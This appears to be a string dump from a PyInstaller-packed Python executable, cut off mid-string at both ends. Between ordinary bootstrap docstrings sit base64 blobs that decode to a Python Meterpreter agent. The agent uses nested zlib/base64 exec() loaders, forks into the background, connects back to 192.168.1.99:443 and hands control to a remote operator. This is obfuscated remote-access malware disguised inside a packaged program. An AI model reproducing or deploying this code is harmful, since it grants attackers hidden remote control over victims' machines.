IzMGE2OGkzYmxYYlFyNzZKZGVSZnR5cnRhUDhHN2FGZmVSYnZ5THRxVmQ5R3V2SXQyNVYyMEsrK2lYWGtYN2NxN1FGQVVmR0pQZWhmdHlydG9WOTVGdS9JdTJwVjNkWmZpWFdrWDc2SmRlUmZ0eXJ0b1Y5N1Y2amZlUmJ2eUx0cVZkNW5yOEM3YWxYZlJycnlMZHVWZHRDdnY2ajVQNzZKZGVmYzRTYlFyNzZKZGVSZnR5cnRvVjk1RnUvSXUycFYzMGE2OGkzYmxYYlFyNzZKZGVSZnR5cnRvVjk1RnUvSXUycFYzcFYyOGkzYmxYYlFyNzZKZGVSZnR5cnRvVjk1RnUvSXUycFYzMGE2OGkzYmxYYlFyNzJxY1R1K2lYWGtYN2NxN2FGZmVSYnZ5THRxVmQ5R3V2SXQyNVYyMEsrK2lYWGtYN2NxN2FGZmVSYnZ5THRxVmQ5R3V2Q3Z0NGwxcEYrOGUwNDYwSysraVhYa1g3Y3E3YUZmZVBlaUNkdVZkZGF6MEx0cVZkOUd1dkl0MjVWMjBLKytpWFhrWDdjcTcrbVFDNzZKZGVSZnR5cnRvVjk1OWlnYWtkN1dxaVhmUnJyeUxkdVZkYVJmdm9sMTVGKzNLdS9wc0ErK2lYWGtYN2NxN2FGZmVSYnZ5THRxVmQ5R3V2Q3Z0NGwyMEsrOUt1M2hYRTBsNjkrbFQ5RlVWbFlJTXJHY3F5TUJDa0lJTXJMQW95TUFpcG9JTWxiUXI3MHB0NlYyTkFIZ1g3Y3E3YUZmZVJidnlibXEzVGUzR1ZCSE53cG4wVzFOMkxYU0xvKytEWUxWV2cvdndEU3VPMGQwN2ZXWmE3dVBhdEV3TDA3SlA3WUNnbW5tTHJxSTF5K2d5dTBxREtialF5Y3ZEc0N5OVlpd3hyVlROd3R6VjVCVFY2M1BiTm1iWG1jYW91cnB0R2lhc3VZM0JwTWE0NnphWE1ZVFFBdTA4bFRNVGU5TnVVOHllR3IvM0xZb3dacE02ME5FK2ZWTGFMSHNoR1FWbVkrcGdrSnB6cVFmcXg2dkgxTUx5WXh1VDRnTHo1cjFibzhDbDE3VnhVNC9LbnNScERqWGRKNHFqcGlvWnhKb1lhanA5ckQxczRXR3R2dlJSNmc0ajk4UGVEREZtYTk0ZTI2SGVPaTFnem9HaFZWQ0pZWGlmbFFrWWhrbWhseVY2NHFUNnMxK1hMYWlxVk9FYTE0MlpjbXZqNWl2VlBmbzI3Z2RLaks1cTYzNUg1MEdUbU9hNDZhUGJ6OU9tajlhM0lTb3ZmZGcwRmtQVWp4eHZsTGVkUHQ4ZTR0azVwWEh2ckZ1MzZDYUlBOTZIV2F2dmZRejlsYWpmUkxmVTRtd2RIWDl2RmQ5czIybEcwWE1Wd2h5NEVhdEE1Vkp4bHd6ZDBzYjUwNmgxM1JlRElobFJSZzZLSFZiMUhKMklLaVdlMGVsenRDMmxxREYxaU00WG95cjFTdFJuYzhQa0ZjaUlwek1VTjFzM2JoV2paOWV1MDk0c3lneWtHYUZkV1RkZHBaS3BpVUY1VTc2enFhSnN3UFJSN3NTSXBqWGZZZHBLTkJBbFRzeDQxREJ6WE1oR",
        "# %s not found in PYZ",
        "",
        "base64",
        "\n        Make this class act like a file, by invoking most methods on its\n        underlying file object.\n        ",
        "\n        Return an instance of FilePos for the current thread. This is a crude\n        # re-implementation of threading.local, which isn't a built-in module\n        # and therefore isn't available.\n        ",
        "/\\",
        "C5kZWFjdGl2YXRlKCkKICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKHNlbGYuX3RyYW5zcG9ydF9zbGVlcCkKICAgICAgICAgICAgICAgICAgICBzZWxmLl90cmFuc3BvcnRfc2xlZXAgPSBOb25lCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IHNlbGYudHJhbnNwb3J0LmFjdGl2YXRlKCk6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudHJhbnNwb3J0X2NoYW5nZSgpCiAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgIyBpdGVyYXRlIG92ZXIgdGhlIGtleXMgYmVjYXVzZSBzZWxmLmNoYW5uZWxzIGNvdWxkIGJlIG1vZGlmaWVkIGlmIG9uZSBpcyBjbG9zZWQKICAgICAgICAgICAgY2hhbm5lbF9pZHMgPSBsaXN0KHNlbGYuY2hhbm5lbHMua2V5cygpKQogICAgICAgICAgICBmb3IgY2hhbm5lbF9pZCBpbiBjaGFubmVsX2lkczoKICAgICAgICAgICAgICAgIGNoYW5uZWwgPSBzZWxmLmNoYW5uZWxzW2NoYW5uZWxfaWRdCiAgICAgICAgICAgICAgICBkYXRhID0gYnl0ZXMoKQogICAgICAgICAgICAgICAgd3JpdGVfcmVxdWVzdF9wYXJ0cyA9IFtdCiAgICAgICAgICAgICAgICBpZiBpc2luc3RhbmNlKGNoYW5uZWwsIE1ldGVycHJldGVyUHJvY2Vzcyk6CiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGNoYW5uZWxfaWQgaW4gc2VsZi5pbnRlcmFjdF9jaGFubmVsczoKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICBwcm9jX2ggPSBjaGFubmVsLnByb2NfaAogICAgICAgICAgICAgICAgICAgIGlmIHByb2NfaC5zdGRlcnJfcmVhZGVyLmlzX3JlYWRfcmVhZHkoKToKICAgICAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHByb2NfaC5zdGRlcnJfcmVhZGVyLnJlYWQoKQogICAgICAgICAgICAgICAgICAgIGVsaWYgcHJvY19oLnN0ZG91dF9yZWFkZXIuaXNfcmVhZF9yZWFkeSgpOgogICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gcHJvY19oLnN0ZG91dF9yZWFkZXIucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgZWxpZiBub3QgY2hhbm5lbC5pc19hbGl2ZSgpOgogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmhhbmRsZV9kZWFkX3Jlc291cmNlX2NoYW5uZWwoY2hhbm5lbF9pZCkKICAgICAgICAgICAgICAgIGVsaWYgaXNpbnN0YW5jZShjaGFubmVsLCBNZXRlcnByZXRlclNvY2tldFRDUENsaWVudCk6CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgc2VsZWN0LnNlbGVjdChbY2hhbm5lbC5maWxlbm8oKV0sIFtdLCBbXSwgMClbMF06CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQgPSBjaGFubmVsLnJlYWQoMSkKICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IHNvY2tldC5lcnJvcjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQgPSBieXRlcygpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbihkKSA9PSAwOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5oYW5kbGVfZGVhZF9yZXNvdXJjZV9jaGFubmVsKGNoYW5uZWxfaWQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICBkYXRhICs9IGQKICAgICAgICAgICAgICAgIGVsaWYgaXNpbnN0YW5jZShjaGFubmVsLCBNZXRlcnByZXRlclNvY2tldFRDUFNlcnZlcik6CiAgICAgICAgICAgICAgICAgICAgaWYgc2VsZWN0LnNlbGVjdChbY2hhbm5lbC5maWxlbm8oKV0sIFtdLCBbXSwgMClbMF06CiAgICAgICAgICAgICAgICAgICAgICAgIChjbGllbnRfc29jaywgY2xpZW50X2FkZHIpID0gY2hhbm5lbC5zb2NrLmFjY2VwdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIHNlcnZlcl9hZGRyID0gY2hhbm5lbC5zb2NrLmdldHNvY2tuYW1lKCkKICAgICAgICAgICAgICAgICAgICAgICAgY2xpZW50X2NoYW5uZWxfaWQgPSBzZWxmLmFkZF9jaGFubmVsKE1ldGVycHJldGVyU29ja2V0VENQQ2xpZW50KGNsaWVudF9zb2NrKSkKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kX3BhY2tldCh0bHZfcGFja19yZXF1ZXN0KCdzdGRhcGlfbmV0X3RjcF9jaGFubmVsX29wZW4nLCBbCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7J3R5cGUnOiBUTFZfVFlQRV9DSEFOTkVMX0lELCAndmFsdWUnOiBjbGllbnRfY2hhbm5lbF9pZH0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7J3R5cGUnOiBUTFZfVFlQRV9DSEFOTkVMX1BBUkVOVElELCAndmFsdWUnOiBjaGFubmVsX2lkfSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsndHlwZSc6IFRMVl9UWVBFX0xPQ0FMX0hPU1QsICd2YWx1ZSc6IGluZXRfcHRvbihjaGFubmVsLnNvY2suZmFtaWx5LCBzZXJ2ZXJfYWRkclswXSl9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgeyd0eXBlJzogVExWX1RZUEVfTE9DQUxfUE9SVCwgJ3ZhbHVlJzogc2VydmVyX2FkZHJbMV19LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgeyd0eXBlJzogVExWX1RZUEVfUEVFUl9IT1NULCAndmFsdWUnOiBpbmV0X3B0b24oY2xpZW50X3NvY2suZmFtaWx5LCBjbGllbnRfYWRkclswXSl9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgeyd0eXBlJzogVExWX1RZUEVfUEVFUl9QT1JULCAndmFsdWUnOiBjbGllbnRfYWRkclsxXX0sCiAgICAgICAgICAgICAgICAgICAgICAgIF0pKQogICAgICAgICAgICAgICAgZWxpZiBpc2luc3RhbmNlKGNoYW5uZWwsIE1ldGVycHJldGVyU29ja2V0VURQQ2xpZW50KToKICAgICAgICAgICAgICAgICAgICBpZiBzZWxlY3Quc2VsZWN0KFtjaGFubmVsLmZpbGVubygpXSwgW10sIFtdLCAwKVswXToKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YSwgcGVlcl9hZGRyZXNzID0gY2hhbm5lbC5zb2NrLnJlY3Zmcm9tKDY1NTM1KQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgc29ja2V0LmVycm9yOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5oYW5kbGVfZGVhZF9yZXNvdXJjZV9jaGFubmVsKGNoYW5uZWxfaWQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZV9yZXF1ZXN0X3BhcnRzLmV4dGVuZChbCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeyd0eXBlJzogVExWX1RZUEVfUEVFUl9IT1NULCAndmFsdWUnOiBwZWVyX2FkZHJlc3NbMF19LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsndHlwZSc6IFRMVl9UWVBFX1BFRVJfUE9SVCwgJ3ZhbHVlJzogcGVlcl9hZGRyZXNzWzFdfSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF0pCiAgICAgICAgICAgICAgICBpZiBkYXRhOgogICAgICAgICAgICAgICAgICAgIHdyaXRlX3JlcXVlc3RfcGFydHMuZXh0ZW5kKFsKICAgICAgICAgICAgICAgICAgICAgICAgeyd0eXBlJzogVExWX1RZUEVfQ0hBTk5FTF9JRCwgJ3ZhbHVlJzogY2hhbm5lbF9pZH0sCiAgICAgICAgICAgICAgICAgICAgICAgIHsndHlwZSc6IFRMVl9UWVBFX0NIQU5ORUxfREFUQSwgJ3ZhbHVlJzogZGF0YX0sCiAgICAgICAgICAgICAgICAgICAgICAgIHsndHlwZSc6IFRMVl9UWVBFX0xFTkdUSCwgJ3ZhbHVlJzogbGVuKGRhdGEpfSwKICAgICAgICAgICAgICAgICAgICBdKQogICAgICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9wYWNrZXQodGx2X3BhY2tfcmVxdWVzdCgnY29yZV9jaGFubmVsX3dyaXRlJywgd3JpdGVfcmVxdWVzdF9wYXJ0cykpCgogICAgZGVmIGhhbmRsZV9kZWFkX3Jlc291cmNlX2NoYW5uZWwoc2VsZiwgY2hhbm5lbF9pZCk6CiAgICAgICAgZGVsIHNlbGYuY2hhbm5lbHNbY2hhbm5lbF9pZF0KICAgICAgICBpZiBjaGFubmVsX2lkIGluIHNlbGYuaW50ZXJhY3RfY2hhbm5lbHM6CiAgICAgICAgICAgIHNlbGYuaW50ZXJhY3RfY2hhbm5lbHMucmVtb3ZlKGNoYW5uZWxfaWQpCiAgICAgICAgc2VsZi5zZW5kX3BhY2tldCh0bHZfcGFja19yZXF1ZXN0KCdjb3JlX2NoYW5uZWxfY2xvc2UnLCBbCiAgICAgICAgICAgIHsndHlwZSc6IFRMVl9UWVBFX0NIQU5ORUxfSUQsICd2YWx1ZSc6IGNoYW5uZWxfaWR9LAogICAgICAgIF0pKQoKICAgIGRlZiBfY29yZV9zZXRfdXVpZChzZWxmLCByZXF1ZXN0LCByZXNwb25zZSk6CiAgICAgICAgbmV3X3V1aWQgPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCBUTFZfVFlQRV9VVUlEKQogICAgICAgIGlmIG5ld191dWlkOgogICAgICAgICAgICBQQVlMT0FEX1VVSUQgPSBiaW5hc2NpaS5iMmFfaGV4KG5ld191dWlkWyd2YWx1ZSddKQogICAgICAgIHJldHVybiBFUlJPUl9TVUNDRVNTLCByZXNwb25zZQoKICAgIGRlZiBfY29yZV9lbnVtZXh0Y21kKHNlbGYsIHJlcXVlc3QsIHJlc3BvbnNlKToKICAgICAgICBpZF9zdGFydCA9IHBhY2tldF9nZXRfdGx2KHJlcXVlc3QsIFRMVl9UWVBFX1VJTlQpWyd2YWx1ZSddCiAgICAgICAgaWRfZW5kID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfTEVOR1RIKVsndmFsdWUnXSArIGlkX3N0YXJ0CiAgICAgICAgZm9yIGZ1bmNfbmFtZSBpbiBzZWxmLmV4dGVuc2lvbl9mdW5jdGlvbnMua2V5cygpOgogICAgICAgICAgICBjb21tYW5kX2lkID0gY21kX3N0cmluZ190b19pZChmdW5jX25hbWUpCiAgICAgICAgICAgIGlmIGlkX3N0YXJ0IDwgY29tbWFuZF9pZCBhbmQgY29tbWFuZF9pZCA8IGlkX2VuZDoKICAgICAgICAgICAgICAgIHJlc3BvbnNlICs9IHRsdl9wYWNrKFRMVl9UWVBFX1VJTlQsIGNvbW1hbmRfaWQpCiAgICAgICAgcmV0dXJuIEVSUk9SX1NVQ0NFU1MsIHJlc3BvbnNlCgogICAgZGVmIF9jb3JlX2dldF9zZXNzaW9uX2d1aWQoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgIC",
        "__name__",
        " ",
        "iter_unpack",
        "nt",
        ".",
        "\n    This class keeps track of the file object representing and current position\n    in a file.\n    ",
        "\n        Initialize an Archive. If path is omitted, it will be an empty Archive.\n        ",
        "eXByYnB3bEtPRmpDM2ZSK1drN1RzbzIwMnNBMEN0blBFSXZtMjljUjJUMWpJL2NpbUhsbFBTK2dlY2ZiMzhzMUhmTm1DbGhZRHQzU2xaVmR0djRQRjFpMWpiY2xTMng5Z2lXSUx2bHZVMzhLVGx0cTB4TDJsMGkxbmJEdHdMUGxydVhiZlpISnNCckhkTFJhR3R2U3haWGd0V21ycFZvdloyMDRZM3pKeDVJd3RsMjVwZFF2MTI4WVBpejNiSGdQZnEzSHNWTEpvcWUwak92WXhIQnRXYkNPRlphVXRabTlKWjl2dVkvbHpDK3UraTY1YXdOMjJLZG5PQjBzT1cvVGVNdlNXZ0xldFJaYjV0ekN2eFo5dHQ0anRFYktVc2NYL0xTSnZ1d1pzQzVaRnZ5MWJiUHRyYkZlSGJjQ3hTTDl2T0RvMmNWbnUzVGE2V0NqOWVaTldhcmVSZG8vY21RWFhMSmRtU1F6TDFsbDJ6bkk1bnZzOFVzQ1czdk00NlpHdnNGQ01SYUFzVW1jWkhrdTVXY2pISTNOSHhzTnlqSmJMdE1DSlJhc3N1V05KTDB0WmVZTHNDSDFaUnRCaVRSYWlza1NKeGR3c2pXdEpWNHVrSGtHV0k2bGtTVm5MbWxsd3gvSXpGbU8wbkpHRmNTM0tiSGxzUzFOWm90anlXQlp3dGxDZXhiZzlmbmZFdUQxWmZZUVhMWlJrNFNHUEp4OFpOczlhSGtGd0N6cDZQUG1EZVd0TGZscXExY04rUjRUV2M4UkhlTXR5ZEphV3RqelZrWUErWXBlV3hyWDRtT1hsTFNGbE1XOExKWG1vNzhqZ1d1YlZjbTJXdUxPRXRJV09MV2xzaWQ4UHg5MHNwV1VwUlV0T1dURGFZOHNXN2o0eXAwZGMrc2hqMmY0QWk3ZGF3TmxDM0JiUXRDQ2xKYUF0bFdtQmJzdWhXdUxVTXFDV0tiZE1tZVVaTFJ4cDRUeUw0ZnRtZ3FlazJQdXhOY3NLV3RyUTlpdlliZ09MemxtSTJsS3Zsa0MzalFlV2s3VEVxY1dITFFOdmNXdExiOXQrQlVzN1czcmJvc2FXUnJkb29tMUhzQjBFbHY2MWdMRkY1aTBXYUlsVDIzVmhPVWVMbUI4YlA0NmNwR1VmYmJPQjdRK3dqU09XeWZldEo4Zm1DUXU1V3piVndwNlcwVDNpN0I1eHRnU3pKUzB0Q1c3eFNndXYyb1lIQzY1YnpOcWlwYlpGd0RMRlIvTDlpUHBiZHRKQ201YTN0MWk2NVl4dEE0NGxmeTNZYm50TWJDK0liVzd4TVBTUlByWUlyeVZMTGQxcU9YdmJDR043Sml4bmJNRjBpNnNmb1g3YjlYR0VubTEvZ1czVnNIMUtsaXUxWFVTMmljSDJxOWhHQ3N0S1c4N2VrczYyMjhjQzZCYld0ZXlxWmR4dG81SnRmYkRvc0tYdkxVWnZJWGpiVzJTeGYwdnpXZ0RhdG92WUppSExHZHNPQUV2SjI4WUIyNFJsNFc4TEZ4OGJiSTVOSGI3LzVzajAyMzRqMjhSbHVYZmI1MktoOU9jOVdxSGRkZHN2WHI2OHZiczl2M3g1K2JpOTJrOC9iRyt2dnZqNG80OXU5NHRYMjkxbC92UHU5Zm5pOXU0eTdwR0FiVjN4NDQ4ZXB0dkg3ZUovVEs5KzNQN3Q0ZUgxdytVbi8vM3VwK25WN1hvUlQ3bDR2UDM3OXNsVlBPNWhmYnpPMS8zODd1SHg1dmtGWDN6SnQxNStzMTNmM0JRdmZ0OWM3SzhmTG03alRTN2VQRXgzZjlrdTQybWZsc2ZqMW4vMHVJZTc5ZVVQeS9YVHYzL2ZmUG5OMTlmUDcvYUhQelJmbm4rNHZuazhQL3k0bkQvLzhlNStXbjY0L09TUHQ1L2t5ZDdjZm5IN2FmUGlLbDcvNXk5ZW5KNWY0dFRrZXl5djcrNWYzOTZkdDRmcjRzdno5VGRmeC9uOThqbmZmSzBHZWo3Rm05czRnQmMzdC8vYXZMZysvM0J6ZTV6VVRSenRaNWY1NHl2L2VUejViOS9kdnRvdXpoZGZYZWpFZU1Iek9YLyt6ZGVmbFMvaWZPSjR2NzIrNUpwOS9xZWJ5L1A1ajM4c3U2di9Vclh0aTYrK3FwcXJiOS83MGZEOGszak11NStjejAvZkhLNis5UWZIcy9uQjB3UHp2Ry9zNVBYNlY5NGVuMTZYZVlUUlo3NzUrbmZYQTRmN2k2WXAzelZObkV1ZTZMZWNiNXhPZm05NzliajkrdlArOElmcTE1LzZybVhpVVUrTnc5ZlpRTytmNnE4MHl2Q3oxam9hMHB2cnZiWlJHM3p3ZUhudlQzLzdiTCsvTHZML2RKMi8vK3FicnkrbXUvWGkvSlZkN3FNRG5lbEE1NmNPOHYzUE85QlpIY2grL24xY2p5L1B1aWg1ZEEvdnRXWThTUWVXUC9yK3ZiN2JQQjF4Tk9qeEhpL2VmOHY4NTFPNy9udjVzdzZqNzFidnQrTFRkK3YzR3YzcG04M3psYm5TV0xUZExURWFhU1M2UC90QUZQLzYzWFhaL2NyWTg3ZUgxM2QvdVpoZnZWNSt5RWYvNWZ6ZHU5RW5uL3pjbEZlZmxWOWVQcGFueCtyMFdGOWQzNVNuNmxTLytIS2k1TSsvMFhtdWJ5NWZMbitMOTd0cGZuLzdSZnlYbzhPMzd5NUdFYmZxaTZ0ZjN2WnhDZjV4YTk5K3NMV25lTVduRnYxenRtajg4K2R0K3VkczA1dkwyMDhmeTZ1NHpqOXYzRC9YenordTlPUDNXdm5QMGNyOHNNNGYyZy95ZkI0NEg4YVg2K1gxL2R2UDgzOHVKMXJ2TVJyanhjZS9jZWhIUDlteUwrWkxmUm5QK255NnY5L3VWaHVkM2orbDUwN0RQNjkrNVJrZk90bm5mdlVQbi9pelpuanFlYi8rdEYrMHovbXNCMmN6Yk9jZkgrNHU0bG5xbyt0MjlOSGx2VDRhLzdyNDNmWEYvMkV2WFgvZVMrdm9wZVdIZStueXdWNjYvci91cGUydjlOTHV0M3RwLzV1OWRQalZYcnIrMytxbDYyLzAwdHQvdnB2ZS9xZjc2ZTEvc3FQZS9sTTk5WDVhM3h0S2x4aEFQN3Q4R2szL05ZN3ZlTTc5K2RQNTdYbDd2RnkrZTdoY3JuNi9uRDc1OGJ4L05uenlORENubW43K1lqRkVhanFMN245K2U3L0Y4MzUzSFI2ZzBaZnIxdzlyZk1mZjR1YUx6NVlYN3diNmg3ZjNaNzNpN1U4L0creHZmL3F0d1Q2NWVodlUvUHQwdm4xOWQvSFR0cHpqMHYvMXg4Znp4YnpGM1hmQm1YQnJ2Vk9GT3NDclpiNSsrVmpOK1FieDNmdW5qcEduRmdkd0hPcjIxL3Z6MjgrL0Q5eGMzdkNJbkpmbXk1azdhczQrdG56MzQ5MFBqL0dzVXpTanoxN3pQejk1M2IrYVVsRnZ6azlEd3dmUEpJNlZJNCtYK3ZJK1R1UG04djdiVjNrOGwvZW5WMWR4UkgrL3ZjL0RlWGVpNy9TY0ovM3VKT0tNNHRsMnFpL242dkh5ZU5LN0llNjlxN1A4LzdnNng2QWFYZlYzMThXdnZOOXllLy9kOWtEelBiL0pGRis5T3QvZWg2MWU3L0dXbjlqNThsYnF6Yis0eWpteWYrZ3FMMDlYK1dpZDU4djhpL0gvTnhyR0R2UTNydk56R3l4NW5jOGZ2c3p2RGphT1BLN1pyMXp6WmY3WlZjNHUvcjhCaVV1RU53PT0nKVswXSkpLCdtZXRfYWVzJywnZXhlYycpLCBtZXRfYWVzLl9fZGljdF9fKQpleGVjKGNvbXBpbGUoemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoY29kZWNzLmdldGVuY29kZXIoJ3V0Zi04JykoJ2VOcWRWRTJQbXpBUVBZZGY0UjRpYk9GRXdWRldxMmpkUTA4OTlROUVLREt4VTZ3Q1JqWjAwMy9mOFFkaG0yNTcyQXVZekh0djVzMTRrdWx1TUhaRTdwZWpuUmdiYWtVdlRVZHIzUXQzMFJvSmgycEJqY3V1MW5USWpYYTZqQ2lScG40UWx4OGVNcjBYOXNGTU80YTRsOS8rVk5acDA1OTFmelduWGZXeXo2UzZvbnJFTlRsbUszMUZBSVhEeXFweHNqMnFzL2xrckFSTVJETWQ0U21rZTZDTGJjM0V1VkUzQ05IeUtTSTFxN0gyeUlibjYxdSsxaUZGcTNyY2tEWGp2UFNwR3NUelhWNDBJZGFiY1M2aDRjMVc5UmNqRmM2bjhicDV6c2s5SmFRVHJBN3BtcGpLT2d3ZFNpYkV5VlNjZ3l2dkh1ZGZjcnE3UFplRUxNN3dGSDRHWUZGV0JEcEJXV0ZBWDdXSmpqaEhEd0xzVWVEejE2UndOTVUrcXV5OVNxZ0hlcFRxb1FaeEtNOS96Z1p3ZlRKQTBoV0Z4OXpWVHQyblVJUFdwd2NEKzkwZitiK1pYbEgvQU5Fek5URkRTUkxkUE5EWlA3bTRnN3A0TExmNEFGOXhRQmZzV0MzZTRINTBoUHFYSXRHY1ZOYmJrOG1lL0pBOUdleTlOcnBWeUx6NFd4VDBvdURmQTU4RlY2YmdjZG95ellxRldVRW9UUHM5N3U2d2NObC9nZnNFdk5jWW03aHNVUEFkRWxja0tEbDFYT0p2ZmNackxNNXc2VEUwakhidXU5ZnVxT0p6LzVRbGZwbFNBYjRDbUV5Mmtud3BDVDViemc1UG03aG00ZVdWTnJGaDJXcmd4bTJuK0JlRER5VWpXNnVHVmx6VUcxK0V4bk5PbHAzenl6eVkxekRlcGhoT3g3WXFaT0dscWFJZEFIOERSZ2RlSkE9PScpWzBdKSksJ21ldF9yc2EnLCdleGVjJyksIG1ldF9yc2EuX19kaWN0X18pCnN5cy5tb2R1bGVzWydtZXRfYWVzJ10gPSBtZXRfYWVzCnN5cy5tb2R1bGVzWydtZXRfcnNhJ10gPSBtZXRfcnNhCmltcG9ydCBtZXRfcnNhLCBtZXRfYWVzCmRlZiBtZXRfcnNhX2VuY3J5cHQoZGVyLCBtc2cpOgogICAgcmV0dXJuIG1ldF9yc2EucnNhX2VuYyhkZXIsIG1zZykKZGVmIG1ldF9hZXNfZW5jcnlwdChrZXksIGl2LCBwdCk6CiAgICByZXR1cm4gbWV0X2Flcy5BRVNDQkMoa2V5KS5lbmNyeXB0KGl2LCBwdCkKZGVmIG1ldF9hZXNfZGVjcnlwdChrZXksIGl2LCBwdCk6CiAgICByZXR1cm4gbWV0X2Flcy5BRVNDQkMoa2V5KS5kZWNyeXB0KGl2LCBwdCkKICAgIAoKX3RyeV90b19mb3JrID0gVFJZX1RPX0ZPUksgYW5kIGhhc2F0dHIob3MsICdmb3JrJykKaWYgbm90IF90cnlfdG9fZm9yayBvciAoX3RyeV90b19mb3JrIGFuZCBvcy5mb3JrKCkgPT0gMCk6CiAgICBpZiBoYXNhdHRyKG9zLCAnc2V0c2lkJyk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBvcy5zZXRzaWQoKQogICAgICAgIGV4Y2VwdCBPU0Vycm9yOgogICAgICAgICAgICBwYXNzCgogICAgaWYgSFRUUF9DT05ORUNUSU9OX1VSTCBhbmQgaGFzX3VybGxpYjoKICAgICAgICB0cmFuc3BvcnQgPSBIdHRwVHJhbnNwb3J0KEhUVFBfQ09OTkVDVElPTl9VUkwsIHByb3h5PUhUVFBfUFJPWFksIHVzZXJfYWdlbnQ9SFRUUF9VU0VSX0FHRU5ULAogICAgICAgICAgICAgICAgaHR0cF9ob3N0PUhUVFBfSE9TVCwgaHR0cF9yZWZlcmVyPUhUVFBfUkVGRVJFUiwgaHR0cF9jb29raWU9SFRUUF9DT09LSUUpCiAgICBlbHNlOgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCgogICAgICAgIHMuY29ubmVjdCgoJzE5Mi4xNjguMS45OScsNDQzKSkKCiAgICAgICAgdHJhbnNwb3J0ID0gVGNwVHJhbnNwb3J0LmZyb21fc29ja2V0KHMpCiAgICBtZXQgPSBQeXRob25NZXRlcnByZXRlcih0cmFuc3BvcnQpCiAgICAjIFBBVENILVNFVFVQLVRSQU5TUE9SVFMgIwogICAgbWV0LnJ1bigpCg==",
        "!i",
        "\n    Load bytecode of Python modules from the executable created by PyInstaller.\n\n    Python bytecode is zipped and appended to the executable.\n\n    NOTE: PYZ format cannot be replaced by zipimport module.\n\n    The problem is that we have no control over zipimport; for instance,\n    it doesn't work if the zip file is embedded into a PKG appended\n    to an executable, like we create in one-file.\n\n    This is PEP-302 finder and loader class for the ``sys.meta_path`` hook.\n    A PEP-302 finder requires method find_module() to return loader\n    class with method load_module(). Both these methods are implemented\n    in one class.\n\n    This is also a PEP-451 finder and loader class for the ModuleSpec type\n    import system. A PEP-451 finder requires method find_spec(), a PEP-451\n    loader requires methods exec_module(), load_module(9 and (optionally)\n    create_module(). All these methods are implemented in this one class.\n\n    To use this class just call\n\n        FrozenImporter.install()\n    ",
        "calcsize",
        "from multiprocessing.semaphore_tracker import main",
        "loader_state",
        "\n",
        "error",
        "\n        Close file and record pos.\n        ",
        "biBFUlJPUl9GQUlMVVJFLCByZXNwb25zZQogICAgICAgIHNlbGYuc2VuZF9wYWNrZXQocmVzcG9uc2UgKyB0bHZfcGFjayhUTFZfVFlQRV9SRVNVTFQsIEVSUk9SX1NVQ0NFU1MpKQogICAgICAgIHNlbGYudHJhbnNwb3J0X2NoYW5nZShuZXdfdHJhbnNwb3J0KQogICAgICAgIHJldHVybiBOb25lCgogICAgZGVmIF9jb3JlX3RyYW5zcG9ydF9yZW1vdmUoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIHVybCA9IHBhY2tldF9nZXRfdGx2KHJlcXVlc3QsIFRMVl9UWVBFX1RSQU5TX1VSTClbJ3ZhbHVlJ10KICAgICAgICBpZiBzZWxmLnRyYW5zcG9ydC51cmwgPT0gdXJsOgogICAgICAgICAgICByZXR1cm4gRVJST1JfRkFJTFVSRSwgcmVzcG9uc2UKICAgICAgICB0cmFuc3BvcnRfZm91bmQgPSBGYWxzZQogICAgICAgIGZvciB0cmFuc3BvcnQgaW4gc2VsZi50cmFuc3BvcnRzOgogICAgICAgICAgICBpZiB0cmFuc3BvcnQudXJsID09IHVybDoKICAgICAgICAgICAgICAgIHRyYW5zcG9ydF9mb3VuZCA9IFRydWUKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgaWYgdHJhbnNwb3J0X2ZvdW5kOgogICAgICAgICAgICBzZWxmLnRyYW5zcG9ydHMucmVtb3ZlKHRyYW5zcG9ydCkKICAgICAgICAgICAgcmV0dXJuIEVSUk9SX1NVQ0NFU1MsIHJlc3BvbnNlCiAgICAgI